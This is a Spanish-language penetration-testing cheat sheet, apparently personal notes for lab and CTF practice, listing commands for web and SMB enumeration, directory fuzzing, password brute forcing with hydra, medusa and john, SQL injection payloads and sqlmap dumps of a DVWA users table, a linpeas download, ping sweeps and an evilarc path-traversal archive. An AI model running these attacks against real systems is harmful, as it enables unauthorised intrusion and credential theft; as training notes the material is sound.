# Comandos básicos para enumerar webs
### Enumeracion Web
	whatweb -v http://
	whatweb -a 3 http://
	wpscan --url http://172.0.0.1:8090 --enumerate u
	/wp-json/wp/v2/users
	/wp-login
	- archivos importantes en wordpress
		wp-config.php
		wp-settings.php --> muy ruidosa y a veces ocaciona denegación de servicio
	- Poner una ip y dominio en el /etc/host 
		nano /etc/hosts
			192.168.10.192 apocalyst.htb
	- enumerar vulnerabilidades plugis y usuarios existentes 
		wpscan --url https://apocalyst.htb -e vp,u --> reconoce vulnerabilidades, usarios validos, gestor de contenidos
	otra forma de enumerar para ver si hay algún proxy que no deje ingresar al sistema
		wafw00f http://
---
### Enumeración web con nikto
	nikto -h http://apocalyst.htb/
---
### Enumeración MSB o samba | smbclient Y AUTENTACIÓN
	ver credenciales default sudo nmap -p --script <ip>
		smb-security-mode
	ver protocolos
		smb-protocols
	Ver smb-discovry
		smb-os-discovery
	ver ssh-http y headers
		ssh*
		http-enum
		http-headers
	ver reursos compartidos
		smb-enum-shares
		smb-enum-users
	otros comandos
		smb-server-stats
		smb-enum-domains
		smb-enum-groups
	aUTENTICACIÓN
		Se puede usar smbmap -H <IP>
		smbmap -u guest -p "" -H <IP>
			smbmap -u "" -p "" -d WORKGROUP -H <ip>
		smbclient -L <IP> -N -seiosn nula
			smbclient -L //<IP>//tmp -L
			smbclient //<IP>//tmp -L 
			smbclient //<IP>//tmp -I <IP>
   		enum4linux -o <IP>
		enum4linux -i <IP>
		enum4linux-ng -As IP-Mvic
---
### Enumeración web con wfuzz
	wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.98.183/FUZZ
	c-->formato colorizado
	hc-->oculta codigo
	t -->para poner hilos con que trabajaar ejemplo -t 400
	L -->sirve para que los cod 301 se hagan un follow redirect
	filtrar por caracteres
		wfuzz -c -L -t 400 --sc=200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.98.183/FUZZ
		wfuzz -c -L -t 400 --sh=200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.98.183/FUZZ
		wfuzz -c -L -t 400 --hc=404 --hl=170 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.98.183/FUZZ
			sc-->muestra cogido
			sh-->filtra por caraceres
			hl-->filtra por lines
	-filtrar por extensiones
		Se creac un txt con las pabras de las extensiones y lo guardamos en un txt llamado extensions.txt
		wfuzz -c -L -t 400 --hc=404 --hh=1077 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions.txt http://192.168.98.183/FUZZ/FUZ2Z
	-Filtrar por agents
		wfuzz -c -L -H " User-Agent: Google Chrome" -t 400 --hc=404 --hh=1077 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions.txt http://192.168.98.183/FUZZ/FUZ2Z
---
### Enumeración web con dirb
	dirb http://192.168.98.183 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
---
### Enumeración con gobuster
	gobuster dir -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://192.168.98.183
---
### Enumeración con dirsearch
	dirsearch -u http://192.168.98.183 -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
---
### MSFCONSOLE-msb
	use auxiliary/scanner/smb/smb_version
	use auxiliary/scanner/smb/smb_login
		set USERPASS_FILE <dicionario>
		set USER_FILE <diccionario>
		set RHOSTS <ip>
---
### Brute Forcing
	Seclist
	Hydra
	hydra -L <dicc> -P <dici> <IP> <protocol-ftp> 
	medusa
	medusa -U <dici> -P <dici> -h <IP> -M <protocol> ftp
	ncrack
	john
	john --format=Raw-MD5 --wordlist=500-worst-passwords.txt <file>
---
### Levantar andoird con docker
	docker run -d --privileged -v /dev/bus/usb:/dev/bus/usb --name adbd sorccu/adb
---
### SQLInjection
	1 union select null, concat(user,password) FROM users#
	
	1' or '1'='1
	
	1' or 1=1 union select null, version() #
	
	sqlmap -u <"url">
	
	sqlmap -u 
	"http://127.0.0.1:42001/vulnerabilities/sqli/?id=5&Submit=Submit#" --cookie="PHPSESSID=g52ousnsppf40ag4huu39204jl;security=low" --dbs

		sqlmap -u 
	"http://127.0.0.1:42001/vulnerabilities/sqli/?id=5&Submit=Submit#" --cookie="PHPSESSID=g52ousnsppf40ag4huu39204jl;security=low" --tables

		sqlmap -u 
	"http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=g52ousnsppf40ag4huu39204jl;security=low" -D dvwa -T users --columns
	
	sqlmap -h | grep "dbs"

	sqlmap -u 
	"http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=g52ousnsppf40ag4huu39204jl;security=low" -D dvwa -T users --dumps
---
### PIVOTING
	docker-compose -f docker-compose-subnet.yml -f docker-compose.yml build

	docker-compose -f docker-compose-subnet.yml -f docker-compose.yml up -d

	docker exec -it <id-attacker>  bash
	docker exec -it victim1y2 bash
		instancias-> sudo apt-get install iputils-ping

	docker-compose -f docker-compose-subnet.yml -f docker-compose.yml down

	debe hacer ping atcnate-helper victima-helper victima-victima y no ping entre victima-atacante ping 

		Hydra
			hydra -L user.txt -P pass.t ssh://172.16.100.11
			ssh root@172.16.100.11

	Linpeas sh-linux
		curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
---
### comando de buscqued y no hacer ruido
	for i in $(seq 1 254); do (ping -c 1 172.16.101.${i} | grep "64 byte from" | grep -Oe "([0-9]{1,3}[\.]){3}[0-9]{1,3}"  &); done;

	for i in $(seq 1 254); do (ping -c 1 172.16.101.${i} | grep "64 byte from"  &); done;
---
### Usando evilrac
	echo "exploit test" > test.css
	python2 evilarc.py -Olinux -f doc.tar -p 'static/css' -d 3
	proxychains4 -q curl http://172.16.101.20.5000/static/css/test.css
---
### conectar ssh id_rsa
	ssh -i id_rsa alexia@<ip>
---
### Transferir archivos, remplazo de wget
	scp -i id_rsa file.tipo alexsia@<ip>:/home/alexia
